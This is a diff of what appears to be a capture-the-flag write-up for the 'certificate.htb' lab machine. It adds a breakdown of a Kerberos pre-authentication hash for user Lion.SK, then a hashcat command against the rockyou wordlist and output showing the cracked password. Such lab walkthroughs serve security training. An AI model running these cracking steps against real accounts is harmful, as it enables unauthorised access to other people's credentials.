@@ -492,7 +492,19 @@ This is the crafted hash
 
 `Lion.SK$` is the username 
 
-``
+`certificate.htb$` is the domain
+
+`23f5159fa1c66ed7b0e561543eba6c010cd31f7e4a4377c2925cf306b98ed1e4f3951a50bc083c9bc0f16f0f586181c9d4ceda3fb5e852f0` is the encrpyted time stamp
+
+```python
+❯❯❯ hashcat -m 19900 '$krb5pa$18$Lion.SK$certificate.htb$23f5159fa1c66ed7b0e561543eba6c010cd31f7e4a4377c2925cf306b98ed1e4f3951a50bc083c9bc0f16f0f586181c9d4ceda3fb5e852f0' /usr/share/wordlists/rockyou.txt
+
+$krb5pa$18$Lion.SK$certificate.htb$23f5159fa1c66ed7b0e561543eba6c010cd31f7e4a4377c2925cf306b98ed1e4f3951a50bc083c9bc0f16f0f586181c9d4ceda3fb5e852f0:!QAZ2wsx
+```
+
+The hash cracked!
+
+
 
 
 
